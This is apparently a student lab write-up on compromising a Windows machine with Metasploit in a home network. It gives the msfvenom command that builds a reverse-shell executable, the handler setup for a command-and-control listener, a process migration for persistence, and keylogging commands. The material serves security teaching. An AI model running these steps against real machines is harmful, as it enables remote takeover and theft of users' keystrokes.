# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="1442" height="948" alt="Screenshot 2025-11-19 113354" src="https://github.com/user-attachments/assets/c2b6f01b-2c33-48ef-9fa5-9f046feaf222" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="822" height="232" alt="Screenshot 2025-11-19 114251" src="https://github.com/user-attachments/assets/2a6795cd-7fc0-4704-9099-6fa26b453ab2" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="563" height="120" alt="Screenshot 2025-11-19 114628" src="https://github.com/user-attachments/assets/b498c825-9811-4021-803c-a3dfc59d5e10" />

Check the status of apache2
## OUTPUT:
<img width="1023" height="426" alt="Screenshot 2025-11-19 114714" src="https://github.com/user-attachments/assets/c3cbce83-dbd9-44e9-ac58-feb4b440cc00" />



Invoke msfconsole:
## OUTPUT:

<img width="948" height="412" alt="Screenshot 2025-11-19 190730" src="https://github.com/user-attachments/assets/e6c9d0ed-6a42-474d-9914-c375a513c516" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="1266" height="685" alt="Screenshot 2025-11-19 190831" src="https://github.com/user-attachments/assets/aa761f94-8987-4469-ba33-39ed2e98b22b" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1122" height="149" alt="Screenshot 2025-11-19 200029" src="https://github.com/user-attachments/assets/857fce72-e555-4982-a3f3-d354f04c8b2e" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:
<img width="739" height="275" alt="Screenshot 2025-11-19 201924" src="https://github.com/user-attachments/assets/500f9909-0852-4b48-bdf8-9fb607316aeb" />



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="720" height="269" alt="image" src="https://github.com/user-attachments/assets/3372dd70-3575-4163-aae1-46adf8292825" />



On kali/parrot give the command exploit
## OUTPUT:



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
